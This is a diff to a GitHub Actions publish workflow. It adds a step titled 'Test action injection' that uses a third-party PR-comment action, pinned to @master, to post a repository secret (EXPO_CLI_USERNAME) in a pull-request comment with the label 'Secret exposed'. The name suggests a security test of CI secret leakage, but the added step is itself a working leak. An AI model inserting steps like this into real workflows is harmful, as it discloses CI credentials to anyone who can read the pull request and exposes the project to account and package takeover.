@@ -5,6 +5,12 @@ jobs:
     name: Install and publish
     runs-on: ubuntu-latest
     steps:
+      - name: Test action injection
+        uses: unsplash/comment-on-pr@master
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          msg: Secret exposed: ${{ secrets.EXPO_CLI_USERNAME }}
       - uses: actions/checkout@v1
       - uses: actions/setup-node@v1
         with:
